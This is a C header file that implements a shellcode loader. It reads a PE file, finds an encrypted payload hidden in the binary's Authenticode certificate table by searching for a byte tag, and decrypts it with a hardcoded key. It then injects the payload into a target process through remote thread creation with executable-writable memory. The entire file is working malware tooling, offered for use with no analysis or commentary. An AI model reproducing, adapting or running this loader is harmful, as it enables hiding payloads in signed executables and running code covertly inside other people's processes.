#ifndef _LOADER_
#define _LOADER_

#include "Config.h"
#include "Helper.h"

#pragma comment(lib, "kernel32.lib")

#define MAX_PATH_LENGTH 255



BOOL SimpleCreateRemoteThread(PVOID payload, SIZE_T payloadLen, DWORD pid){
	
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, payloadLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, payload, payloadLen, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	
	return TRUE;
}

BOOL LoadAndInjectShellCode()
{
	
	// PE path and Encryption Key needed
	CHAR _fPath[MAX_PATH_LENGTH] = {};
	HANDLE HThread = INVALID_HANDLE_VALUE;
	CHAR* _encKey = "ff22WEi8lkFQN5X";
	DWORD _encryptedDataSize = 0;
	DWORD _dataOffset = 0;
	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert = {};
	CHAR* _decryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	LPVOID shellcode = NULL;
	BYTE* _pePtr = NULL;
	PIMAGE_DOS_HEADER _dosHeader = {};
	PIMAGE_NT_HEADERS _ntHeader = {};
	IMAGE_OPTIONAL_HEADER _optHeader = {};
	DWORD _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	SIZE_T _index = 0;

	//Loading PE File
	memcpy_s(&_fPath, MAX_PATH_LENGTH, SIGINJECTED_PE_FILE, MAX_PATH_LENGTH);
	printf("[*]: Loading/Parsing PE File '%s'\n", _fPath);
	_fHandle = CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		exit(EXIT_FAILURE);
	}

	_fSize = GetFileSize(_fHandle, NULL);
	_peBlob = (char*) malloc(_fSize);
	ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		//goto _Exit;
	}
	
	_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		fprintf(stderr, "[!]: '%s' is not a valid PE file\n", _fPath);
		//goto _Exit;
	}

	_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;

	if (IsWow64(GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	//Linear search for 0xfeedface0xfeedface tag, , , 
	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
	for (_index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xca && *(_pePtr + _index + 1) == 0xda && *(_pePtr + _index + 2) == 0xfc && *(_pePtr + _index + 3) == 0xae) {
			_dataOffset = _index + 8;
			break;
		}
	}

	if (_dataOffset != _index + 8) {
		fprintf(stderr, "[!]: Could not locate data/shellcode");
		//goto _Exit;
	}

	//Decrypting
	_encryptedDataSize = _CertTableSize - _dataOffset;
	_decryptedData = (CHAR*)malloc(_encryptedDataSize);
	memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);
	decrypt((unsigned char*)_decryptedData, _encryptedDataSize, (unsigned char*)_encKey, strlen(_encKey), (unsigned char*)_decryptedData);
	
		
	// CreateRemoteThread
	BOOL ret = SimpleCreateRemoteThread((PBYTE)_decryptedData, _encryptedDataSize, FindPID(TARGET_PROCESS));


	return 0;
}



#endif
